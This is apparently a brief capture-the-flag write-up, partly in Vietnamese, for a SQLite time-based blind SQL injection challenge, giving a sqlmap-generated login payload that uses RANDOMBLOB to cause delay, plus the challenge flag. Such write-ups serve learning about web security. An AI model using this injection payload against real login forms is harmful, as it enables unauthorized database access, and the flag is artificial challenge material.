![image-20200608011614283](images/image-20200608011614283.png)

Time-based Blind

Title: SQLite > 2.0

Do không có thời gian viết code bài này nên mình dùng luôn sqlmap :))

Payload: user=admin' OR 9766=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- FdpX&pass=admin

![image-20200608011853129](images/image-20200608011853129.png)

Flag: **ractf{Y0u_B3tt3r_N0t_h4v3_us3d_sqlm4p}**

